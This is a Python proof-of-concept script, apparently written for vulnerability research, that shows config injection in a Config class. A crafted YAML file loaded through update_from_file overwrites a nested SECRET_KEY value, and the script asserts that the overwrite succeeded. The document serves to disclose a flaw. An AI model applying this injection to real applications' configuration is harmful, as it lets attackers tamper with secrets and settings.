# CONFIG INJECTION PROOF OF CONCEPT (PoC)
# Vulnerable Func: update_from_file -> update_from_config -> __setattr__
# Type: config-injection (dict-based traversal, not true class pollution)
#
# update_from_file loads a YAML and passes it to update_from_config, which
# flattens nested keys into dotted paths and calls __setattr__. __setattr__
# splits on "." and traverses via __getattr__ (dict-item access). A malicious
# YAML can overwrite arbitrary existing config values at any nesting depth.
# Note: traversal uses self[key] (dict lookup), not real getattr, so it
# cannot reach actual class attributes like __class__.

import os
import tempfile
import yaml

from local_utils.config_utils.parse_config_utils import Config

cfg = Config()
cfg["TRAIN"] = Config({"EPOCH_NUMS": 100, "BATCH_SIZE": 32, "SECRET_KEY": "original"})

payload_value = "pwnd"

def run_poc():
  malicious_yaml = {"TRAIN": {"SECRET_KEY": payload_value}}
  tmp = tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False)
  yaml.dump(malicious_yaml, tmp)
  tmp.close()
  cfg.update_from_file(tmp.name)
  os.unlink(tmp.name)

def verify_poc():
  assert cfg["TRAIN"]["SECRET_KEY"] == "original", "Pre-condition failed"
  run_poc()
  print(f"After: cfg['TRAIN']['SECRET_KEY'] = {cfg['TRAIN']['SECRET_KEY']}")
  assert cfg["TRAIN"]["SECRET_KEY"] == payload_value, "Config injection failed!"
  print("[Pass] Config injection PoC verified!")

if __name__ == "__main__":
  verify_poc()
